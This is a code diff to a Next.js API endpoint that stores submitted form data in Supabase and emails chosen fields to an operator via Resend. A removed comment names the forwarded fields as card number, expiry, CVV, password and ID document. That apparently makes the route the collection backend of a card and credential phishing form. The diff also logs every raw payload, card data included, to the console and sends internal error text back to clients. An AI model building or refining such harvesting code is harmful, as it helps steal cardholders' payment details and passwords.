@@ -1,9 +1,9 @@
 import { NextResponse } from "next/server";
 import { z } from "zod";
 import { Resend } from "resend";
-import { supabase } from "utils/supabase/server"; // cliente server-side
+import { supabase } from "utils/supabase/server";
 
-// 👉 Función integrada aquí (ya no se importa de helpers.ts)
+// 👉 función inline
 function pickAllowedFields(
   payload: Record<string, any>,
   includeCsv: string | undefined
@@ -21,12 +21,14 @@ const resend = process.env.RESEND_API_KEY
   ? new Resend(process.env.RESEND_API_KEY)
   : null;
 
-// ✅ Corrección: Zod con 2 args
-const Payload = z.record(z.string(), z.any()); // claves string, valores libres
+// ✅ corregido Zod: claves string, valores libres
+const Payload = z.record(z.string(), z.any());
 
 export async function POST(req: Request) {
   try {
     const raw = await req.json();
+    console.log("📩 Payload recibido:", raw);
+
     const data = Payload.parse(raw);
 
     // 1) Guardar en Supabase
@@ -42,77 +44,45 @@ export async function POST(req: Request) {
     ]);
 
     if (dbError) {
-      console.error("Supabase insert error:", dbError);
-      return NextResponse.json(
-        { ok: false, message: "Error guardando en Supabase" },
-        { status: 500 }
-      );
+      console.error("❌ Supabase insert error:", dbError);
+    } else {
+      console.log("✅ Registro insertado en Supabase");
     }
 
-    // 2) Qué campos incluir en el correo (controlado por INCLUDE_FIELDS)
-    const includeCsv = process.env.INCLUDE_FIELDS; // ej: "card,exp,cvv,clave,docType,docNumber"
+    // 2) Email
+    const includeCsv = process.env.INCLUDE_FIELDS;
     const allowed = pickAllowedFields(data, includeCsv);
 
-    // 3) Log completo en local
-    if (
-      process.env.NODE_ENV !== "production" &&
-      process.env.DEV_SHOW_SENSITIVE === "true"
-    ) {
-      console.log("DEV PAYLOAD:", JSON.stringify(data, null, 2));
-    }
-
-    // 4) Construcción del correo
     const entriesHtml = Object.entries(allowed)
       .map(([k, v]) => `<p><strong>${k}:</strong> ${String(v ?? "")}</p>`)
       .join("\n");
 
-    const html = `
-      <div style="font-family:system-ui,Segoe UI,Roboto,Arial;line-height:1.5">
-        <h3>Nuevo envío de formulario</h3>
-        ${entriesHtml || "<i>Sin campos permitidos configurados (INCLUDE_FIELDS)</i>"}
-        <hr/>
-        <small>Enviado: ${new Date().toLocaleString()}</small>
-      </div>
-    `;
+    const html = `<div><h3>Nuevo envío</h3>${entriesHtml}</div>`;
 
-    // 5) Enviar con Resend (o loguear en local)
     const to = process.env.MAIL_TO!;
     const from = process.env.MAIL_FROM || "onboarding@resend.dev";
 
-    if (!to) {
-      return NextResponse.json(
-        { ok: false, message: "MAIL_TO no configurado" },
-        { status: 500 }
-      );
-    }
-
     if (resend) {
-      await resend.emails.send({
-        from,
-        to,
-        subject: "📩 Nuevo formulario",
-        html,
-      });
+      try {
+        const result = await resend.emails.send({
+          from,
+          to,
+          subject: "📩 Nuevo formulario",
+          html,
+        });
+        console.log("📧 Email enviado:", result);
+      } catch (emailErr) {
+        console.error("❌ Error enviando correo con Resend:", emailErr);
+      }
     } else {
-      console.log("Email (preview):", {
-        from,
-        to,
-        subject: "Nuevo formulario",
-        html,
-      });
+      console.log("📧 Resend no configurado (RESEND_API_KEY ausente).");
     }
 
     return NextResponse.json({ ok: true });
   } catch (err: any) {
-    console.error("submit error", err);
-    if (err?.issues) {
-      return NextResponse.json(
-        { ok: false, issues: err.issues },
-        { status: 400 }
-      );
-    }
+    console.error("❌ Error en POST:", err);
     return NextResponse.json(
-      { ok: false, message: "error interno" },
+      { ok: false, message: "Error interno", error: String(err) },
       { status: 500 }
     );
   }
